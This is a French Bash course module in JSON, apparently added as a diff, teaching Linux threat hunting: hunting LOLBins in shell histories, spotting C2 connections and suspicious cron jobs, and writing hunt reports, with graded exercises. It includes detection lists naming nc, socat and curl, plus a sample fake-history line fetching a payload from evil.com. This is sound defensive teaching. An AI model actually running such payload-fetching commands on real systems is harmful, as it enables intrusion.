@@ -1,0 +1,58 @@
+{
+  "id": "bash-l6-m6",
+  "title": "Threat Hunting sous Linux",
+  "lang": "bash",
+  "level": 6,
+  "order": 6,
+  "estimatedMinutes": 65,
+  "course": [
+    {
+      "section": "Philosophie du Threat Hunting",
+      "content": "Le **threat hunting** est une approche proactive : au lieu d'attendre les alertes, l'analyste **cherche activement** des signes de compromission sur des systèmes présumés sains.\n\n**Méthodologie** (Intel-driven hunting) :\n1. **Hypothèse** : \"Un attaquant a pu accéder via un compte de service\"\n2. **Recherche** : Chercher les anomalies sur les logins du compte de service\n3. **Analyse** : Corréler avec d'autres IOC\n4. **Documentation** : Répertorier les TTP (Tactics, Techniques, Procedures)\n\n```bash\n# ─── Techniques MITRE ATT&CK à chercher ───\n# T1059 : Interpréteurs de commandes\n# T1078 : Comptes valides (credential abuse)\n# T1021 : Remote Services (SSH, RDP)\n# T1136 : Création de comptes\n# T1053 : Scheduled Task/Job (cron)\n\n# ─── Démarrer par les comptes ───\n# Comptes avec UID 0 (root équivalents)\nawk -F: '$3 == 0 {print $1}' /etc/passwd\n\n# Comptes avec shell interactif\nawk -F: '$7 !~ /nologin|false|sync/ {print $1, $7}' /etc/passwd\n```"
+    },
+    {
+      "section": "Hunt — Détection de Living off the Land",
+      "content": "```bash\n#!/bin/bash\n# Hunt : LOLBins (Living off the Land Binaries)\n# Attaquants utilisent des outils légitimes pour éviter la détection\n\nLOLBINS=(\n    \"base64\" \"openssl\" \"python\" \"python3\" \"perl\" \"ruby\"\n    \"wget\" \"curl\" \"nc\" \"ncat\" \"socat\"\n    \"dd\" \"xxd\" \"hexdump\"\n    \"crontab\" \"at\" \"batch\"\n    \"nmap\" \"masscan\"\n)\n\necho \"=== Hunt : LOLBins utilisés récemment ===\"\necho \"\"\n\n# Chercher dans bash_history de tous les utilisateurs\nfor home in /root /home/*; do\n    hist=\"$home/.bash_history\"\n    [[ ! -f \"$hist\" ]] && continue\n    \n    echo \"[$(basename $home)]\"\n    for bin in \"${LOLBINS[@]}\"; do\n        matches=$(grep -c \"^$bin \\|[^a-z]$bin \" \"$hist\" 2>/dev/null || echo 0)\n        if [[ $matches -gt 0 ]]; then\n            echo \"  $bin : $matches utilisation(s)\"\n            grep -E \"^$bin |[^a-z]$bin \" \"$hist\" | tail -3 | sed 's/^/    /'\n        fi\n    done\ndone\n\n# Chercher dans les logs système\necho \"\"\necho \"[Logs systemd — commandes LOLBin]\"\nfor bin in python curl wget base64; do\n    count=$(journalctl -n 10000 2>/dev/null | grep -c \"$bin\" || echo 0)\n    [[ $count -gt 0 ]] && echo \"  $bin : $count occurrences dans journal\"\ndone\n```"
+    },
+    {
+      "section": "Hunt — Indicateurs de C2 et exfiltration",
+      "content": "```bash\n#!/bin/bash\n# Hunt : Communications C2 et exfiltration\n\necho \"=== Hunt : Indicateurs C2 ===\"\n\n# ─── Connexions persistantes longues ───\necho \"[Connexions sortantes actives]\"\nss -tn state established \\\n  | awk 'NR>1 && $5 !~ /^(127\\.|10\\.|192\\.168\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.)/ {print $4, $5}' \\\n  | head -20\n\n# ─── DNS habituel vs. inhabituel ───\necho \"\"\necho \"[Serveurs DNS utilisés]\"\ngrep 'nameserver' /etc/resolv.conf\n# En production : analyser pcap pour DNS vers serveurs inhabituels\n\n# ─── Tâches cron avec connexions réseau ───\necho \"\"\necho \"[Cron avec réseau]\"\ngrep -r -E 'curl|wget|nc |ncat|python.*socket|bash.*tcp' \\\n    /etc/crontab /etc/cron.d/ /var/spool/cron/ 2>/dev/null\n\n# ─── Processus avec connexions vers ports inhabituels ───\necho \"\"\necho \"[Connexions ports > 10000 (suspects)]\"\nss -tnp | awk '$5 ~ /:[0-9]{5}/ {print}' | head -10\n\n# ─── Transferts de données volumineux ───\necho \"\"\necho \"[Transferts récents suspects]\"\n# Chercher dans les logs Apache des téléchargements volumineux\nif [[ -f /var/log/apache2/access.log ]]; then\n    awk '$10 > 10000000 {print $7, $10/1000000 \"MB\", $1}' /var/log/apache2/access.log \\\n      | sort -k2 -rn | head -5\nfi\n```"
+    },
+    {
+      "section": "Hunt — Rapport et hypothèses",
+      "content": "```bash\n#!/bin/bash\n# Génération d'un rapport de threat hunting\n\nhunt_rapport() {\n    local hunt_id=\"HUNT-$(date +%Y%m%d-%H%M)\"\n    local rapport=\"/tmp/${hunt_id}.md\"\n    \n    cat > \"$rapport\" << MARKDOWN\n# Rapport de Threat Hunt — $hunt_id\n\n**Date** : $(date '+%Y-%m-%d %H:%M')  \n**Analyste** : $(whoami)  \n**Scope** : $(hostname)\n\n## Hypothèse\n\nRecherche d'indicateurs de compromission via LOLBins et connexions C2 suspectes.\n\n## Findings\n\nMARKDOWN\n    \n    # Ajouter les findings dynamiquement\n    echo \"### Comptes avec shell interactif\" >> \"$rapport\"\n    awk -F: '$7 !~ /nologin|false|sync/ {print \"- \" $1 \" (\" $7 \")\"}' \\\n        /etc/passwd >> \"$rapport\"\n    \n    echo \"\" >> \"$rapport\"\n    echo \"### Ports en écoute\" >> \"$rapport\"\n    ss -tlnp | awk 'NR>1 {print \"- \" $4}' >> \"$rapport\"\n    \n    echo \"\" >> \"$rapport\"\n    echo \"## Conclusion\" >> \"$rapport\"\n    echo \"Hunt terminé à $(date). Aucune compromission confirmée / Suspicion sur [X].\" >> \"$rapport\"\n    \n    echo \"Rapport créé : $rapport\"\n    head -20 \"$rapport\"\n}\n\nhunt_rapport\n```"
+    }
+  ],
+  "exercises": [
+    {
+      "id": "bash-l6-m6-ex1",
+      "title": "Lister les comptes avec shell interactif",
+      "description": "Identifier les comptes pouvant se connecter en interactive",
+      "instructions": "Listez les utilisateurs du fichier `/etc/passwd` qui ont un shell autre que `/sbin/nologin`, `/bin/false` ou `/usr/sbin/nologin`. Affichez le nombre :\n```\nComptes interactifs : X\n```",
+      "validationType": "output_contains",
+      "expectedOutput": "Comptes interactifs :",
+      "correction": "count=$(awk -F: '$7 !~ /nologin|false/ {print $1}' /etc/passwd | wc -l)\necho \"Comptes interactifs : $count\"",
+      "explanation": "`awk -F:` utilise `:` comme séparateur de champ. `$7` est le 7ème champ (le shell). `!~` est le test \"ne matche pas la regex\". Les comptes sans shell interactif sont des services — ceux avec shell peuvent être abusés."
+    },
+    {
+      "id": "bash-l6-m6-ex2",
+      "title": "Chercher un LOLBin dans l'historique",
+      "description": "Détecter l'utilisation de curl dans un historique bash",
+      "instructions": "Créez un faux historique avec des commandes dont `curl http://evil.com/payload`, puis vérifiez si `curl` y est utilisé. Affichez :\n```\nLOLBin curl détecté\n```",
+      "validationType": "output_contains",
+      "expectedOutput": "LOLBin curl détecté",
+      "correction": "echo -e 'ls -la\\ncurl http://evil.com/payload\\nwhoami' > /tmp/test_history\nif grep -q 'curl ' /tmp/test_history; then\n    echo \"LOLBin curl détecté\"\nfi",
+      "explanation": "Le threat hunting dans les historiques bash est une technique simple et efficace. Les attaquants utilisent `curl` ou `wget` pour télécharger des payloads post-exploitation (stagers, reverse shells, outils)."
+    },
+    {
+      "id": "bash-l6-m6-ex3",
+      "title": "Générer un résumé de hunt",
+      "description": "Produire un rapport concis de recherche de menaces",
+      "instructions": "Collectez le hostname, le nombre de comptes interactifs et de ports en écoute. Affichez :\n```\nHunt terminé : [hostname] | Comptes: X | Ports: Y\n```",
+      "validationType": "output_contains",
+      "expectedOutput": "Hunt terminé :",
+      "correction": "h=$(hostname)\ncomptes=$(awk -F: '$7 !~ /nologin|false/ {print $1}' /etc/passwd | wc -l)\nports=$(ss -tlnp 2>/dev/null | grep -c LISTEN)\necho \"Hunt terminé : $h | Comptes: $comptes | Ports: $ports\"",
+      "explanation": "Un résumé de hunt permet de comparer rapidement l'état d'une machine à d'autres. Si une machine a 2x plus de ports ou de comptes que les autres, c'est un signal d'anomalie à creuser."
+    }
+  ]
+}
